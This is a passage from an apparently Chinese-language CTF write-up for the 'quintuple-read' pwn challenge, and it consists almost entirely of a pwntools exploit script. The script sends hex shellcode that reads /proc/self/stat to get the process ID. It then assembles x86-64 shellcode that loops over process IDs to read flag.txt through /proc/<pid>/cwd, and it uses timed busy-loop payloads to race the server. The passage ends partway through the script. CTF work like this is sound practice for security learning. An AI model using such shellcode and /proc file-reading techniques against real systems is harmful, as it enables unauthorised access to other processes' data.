<p>很变态的是远程的机器 cpu MHz 为 2800.218，而我本地有 5600+，所以本地跑起来会快很多，这题基本上没办法在本地测试，远程又是静态靶机，受到网络环境和其他选手的影响，这个“有限次数的循环”并不是那么好把控。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> textwrap</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./binary</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">quintuple-read.challs.infobahnc.tf</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1337</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> io</span><br><br><br><span style="color:#A0ADA0"># 这个函数通过读取远程的 /proc/self/stat 获取当前的 pid，缩小 pid 遍历范围</span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> getpid</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io1 </span><span style="color:#999999">=</span><span style="color:#393A34"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io1</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">48b801010101010101015048b86d672e72756075014831042448b82f70726f632f7365504889e731d231f66a02580f054889c731c031d2b6104889e60f056a015f4889c24889e66a01580f05</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io1</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">stdout: b'</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pid </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io1</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> (binary) R</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io1</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pid</span><br><br><br><span style="color:#A65E2B">PROC_STR</span><span style="color:#999999"> =</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/proc/</span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">TAIL_STR</span><span style="color:#999999"> =</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/cwd/flag.txt</span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">PREFIX_STR</span><span style="color:#999999"> =</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">[+] Found flag from PID </span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">SUFFIX_STR</span><span style="color:#999999"> =</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">NOW_FLAG_STR</span><span style="color:#999999"> =</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">now flag</span><span style="color:#B5695977">"</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> search_flag</span><span style="color:#2993a3">(</span><br><span style="color:#393A34">    start_pid</span><span style="color:#999999">,</span><br><span style="color:#393A34">    end_pid</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#999999">,</span><br><span style="color:#393A34">    buf_size</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#999999"> =</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><br><span style="color:#2993a3">)</span><span style="color:#999999"> -</span><span style="color:#999999">></span><span style="color:#998418"> bytes</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> start_pid </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959"> or</span><span style="color:#393A34"> end_pid </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        raise</span><span style="color:#998418"> ValueError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">start_pid and end_pid must be non-negative</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> start_pid </span><span style="color:#AB5959">></span><span style="color:#393A34"> end_pid</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        raise</span><span style="color:#998418"> ValueError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">start_pid must be &#x3C;= end_pid</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    open_sc </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">open</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">rdi</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    read_sc </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">rdi</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r15</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> buf_size</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write_prefix </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rsi</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">PREFIX_STR</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write_suffix </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rsi</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">SUFFIX_STR</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write_digits </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r8</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rbp</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write_payload </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r15</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r11</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write_newline </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rsi</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    write_now_flag </span><span style="color:#999999">=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rsi</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">NOW_FLAG_STR</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    asm_code </span><span style="color:#999999">=</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"""</span><br><span style="color:#B56959">        cld</span><br><span style="color:#B56959">        sub rsp, 0x200</span><br><span style="color:#B56959">        mov r13, rsp              /* path buffer */</span><br><span style="color:#B56959">        lea r14, [r13 + 0x40]     /* digits scratch */</span><br><span style="color:#B56959">        lea r15, [r14 + 0x20]     /* read buffer */</span><br><span style="color:#B56959">        mov r12d, </span><span style="color:#2993a3">{</span><span style="color:#393A34">start_pid</span><span style="color:#2993a3">}</span><span style="color:#B56959">     /* current PID */</span><br><span style="color:#B56959">        mov r10d, </span><span style="color:#2993a3">{</span><span style="color:#393A34">end_pid</span><span style="color:#2993a3">}</span><span style="color:#B56959">       /* max PID */</span><br><span style="color:#B56959">    loop_start:</span><br><span style="color:#B56959">        mov eax, r12d</span><br><span style="color:#B56959">        mov ecx, 10</span><br><span style="color:#B56959">        lea r9, [r14 + 0x10]</span><br><span style="color:#B56959">        mov byte ptr [r9], 0</span><br><span style="color:#B56959">        mov r8, r9</span><br><span style="color:#B56959">    build_digits:</span><br><span style="color:#B56959">        xor edx, edx</span><br><span style="color:#B56959">        div ecx</span><br><span style="color:#B56959">        add dl, '0'</span><br><span style="color:#B56959">        dec r8</span><br><span style="color:#B56959">        mov [r8], dl</span><br><span style="color:#B56959">        test eax, eax</span><br><span style="color:#B56959">        jnz build_digits</span><br><span style="color:#B56959">        mov rdx, r9</span><br><span style="color:#B56959">        sub rdx, r8</span><br><span style="color:#B56959">        mov rbp, rdx              /* digit count */</span><br><span style="color:#B56959">        lea rdi, [r13]</span><br><span style="color:#B56959">        lea rsi, [rip + proc_str]</span><br><span style="color:#B56959">        mov ecx, </span><span style="color:#2993a3">{</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">PROC_STR</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        rep movsb</span><br><span style="color:#B56959">        mov rsi, r8</span><br><span style="color:#B56959">        mov rcx, rbp</span><br><span style="color:#B56959">        rep movsb</span><br><span style="color:#B56959">        lea rsi, [rip + tail_str]</span><br><span style="color:#B56959">        mov ecx, </span><span style="color:#2993a3">{</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">TAIL_STR</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        rep movsb</span><br><span style="color:#B56959">        mov byte ptr [rdi], 0</span><br><span style="color:#B56959">        mov rdi, r13</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">open_sc</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        test rax, rax</span><br><span style="color:#B56959">        js next_pid</span><br><span style="color:#B56959">        mov rbx, rax              /* fd */</span><br><span style="color:#B56959">        mov rdi, rbx</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">read_sc</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        mov r11, rax              /* bytes read */</span><br><span style="color:#B56959">        cmp r11, 0</span><br><span style="color:#B56959">        jle next_pid</span><br><span style="color:#B56959">        lea rsi, [rip + prefix_str]</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">write_prefix</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        mov rsi, r8</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">write_digits</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        lea rsi, [rip + suffix_str]</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">write_suffix</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        mov rsi, r15</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">write_payload</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        lea rsi, [rip + newline_str]</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">write_newline</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        jmp print_local</span><br><span style="color:#B56959">    next_pid:</span><br><span style="color:#B56959">        inc r12d</span><br><span style="color:#B56959">        cmp r12d, r10d</span><br><span style="color:#B56959">        jle loop_start</span><br><span style="color:#B56959">        mov r12d, </span><span style="color:#2993a3">{</span><span style="color:#393A34">start_pid</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        jmp loop_start</span><br><span style="color:#B56959">    print_local:</span><br><span style="color:#B56959">        lea rsi, [rip + now_flag_str]</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">write_now_flag</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">        lea rsi, [rip + newline_str]</span><br><span style="color:#2993a3">{</span><span style="color:#393A34">write_newline</span><span style="color:#2993a3">}</span><br><span style="color:#B56959">    """</span><br><br><span style="color:#393A34">    asm_code </span><span style="color:#999999">+=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">open</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./flag.txt</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    asm_code </span><span style="color:#999999">+=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">rax</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r15</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> buf_size</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    asm_code </span><span style="color:#999999">+=</span><span style="color:#393A34"> shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r15</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rax</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    asm_code </span><span style="color:#999999">+=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">        ud2</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><br><span style="color:#393A34">    asm_code </span><span style="color:#999999">+=</span><span style="color:#AB5959"> f</span><span style="color:#B56959">"""</span><br><span style="color:#B56959">    proc_str:</span><br><span style="color:#B56959">        .ascii "</span><span style="color:#2993a3">{</span><span style="color:#A65E2B">PROC_STR</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><span style="color:#B56959">"</span><br><span style="color:#B56959">    tail_str:</span><br><span style="color:#B56959">        .ascii "</span><span style="color:#2993a3">{</span><span style="color:#A65E2B">TAIL_STR</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><span style="color:#B56959">"</span><br><span style="color:#B56959">    prefix_str:</span><br><span style="color:#B56959">        .ascii "</span><span style="color:#2993a3">{</span><span style="color:#A65E2B">PREFIX_STR</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><span style="color:#B56959">"</span><br><span style="color:#B56959">    suffix_str:</span><br><span style="color:#B56959">        .ascii "</span><span style="color:#2993a3">{</span><span style="color:#A65E2B">SUFFIX_STR</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><span style="color:#B56959">"</span><br><span style="color:#B56959">    newline_str:</span><br><span style="color:#B56959">        .byte 0x0a</span><br><span style="color:#B56959">    now_flag_str:</span><br><span style="color:#B56959">        .ascii "</span><span style="color:#2993a3">{</span><span style="color:#A65E2B">NOW_FLAG_STR</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">}</span><span style="color:#B56959">"</span><br><span style="color:#B56959">    """</span><br><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">asm_code</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#A65E2B">TOTAL_PREFIX</span><span style="color:#999999"> =</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">total cycles: </span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">AVG_PREFIX</span><span style="color:#999999"> =</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">avg cycles: </span><span style="color:#B5695977">"</span><br><br><br><span style="color:#393A34">pid </span><span style="color:#999999">=</span><span style="color:#393A34"> getpid</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sc1 </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">mov ecx, 0x05b9b9b9; loop_here: loop loop_here;</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # 0x04b9b9b9 可以改</span><br><span style="color:#393A34">sc2 </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">push 0x131A1A1A; pop rcx; loop_dec: dec rcx; jnz loop_dec</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # 0x121A1A1A 可以改</span><br><span style="color:#393A34">sc3 </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">add ecx, 0x388b0d0d</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">loop_eq: cmp al, al; loope loop_eq;</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # \x8b\x0d\x8b\xe1 可以</span><br><span style="color:#393A34">sc4 </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">nop</span><br><span style="color:#B56959">nop</span><br><span style="color:#B56959">nop</span><br><span style="color:#B56959">jrcxz  done</span><br><span style="color:#B56959">sub    cl, 1</span><br><span style="color:#B56959">mov    edx, 0x03090909</span><br><span style="color:#B56959">inner:</span><br><span style="color:#B56959">    sub    edx, 1</span><br><span style="color:#B56959">    test   edx, edx</span><br><span style="color:#B56959">    jg     inner</span><br><span style="color:#B56959">    jmp    short $-0x13</span><br><span style="color:#B56959">    nop</span><br><span style="color:#B56959">done:</span><br><span style="color:#B5695977">"""</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # 0x03090909 可以改</span><br><span style="color:#A0ADA0"># loop_start:</span><br><span style="color:#A0ADA0">#     inc ecx</span><br><span style="color:#A0ADA0">#     inc ecx</span><br><span style="color:#A0ADA0">#     loopne loop_start</span><br><span style="color:#393A34">sc5 </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">        mov     ebx, 0x33333333</span><br><span style="color:#B56959">        mov     ecx, ebx</span><br><span style="color:#B56959">loop5:  or      al, 0x33</span><br><span style="color:#B56959">        or      al, 0x33</span><br><span style="color:#B56959">        loopne  loop5</span><br><span style="color:#B5695977">"""</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0"> # 0x33333333 可以改</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#393A34">pid</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">search </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">search_flag</span><span style="color:#1e754f">(</span><span style="color:#393A34">pid</span><span style="color:#999999">,</span><span style="color:#393A34"> pid </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">800</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1 </span><span style="color:#999999">=</span><span style="color:#393A34"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2 </span><span style="color:#999999">=</span><span style="color:#393A34"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc1</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc2</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc3</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc4</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">search</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res1 </span><span style="color:#999999">=</span><span style="color:#393A34"> p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#393A34">res1</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">p2 </span><span style="color:#999999">=</span><span style="color:#393A34"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">search</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res2 </span><span style="color:#999999">=</span><span style="color:#393A34"> p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#393A34">res2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">p2 </span><span style="color:#999999">=</span><span style="color:#393A34"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">search</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res3 </span><span style="color:#999999">=</span><span style="color:#393A34"> p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span 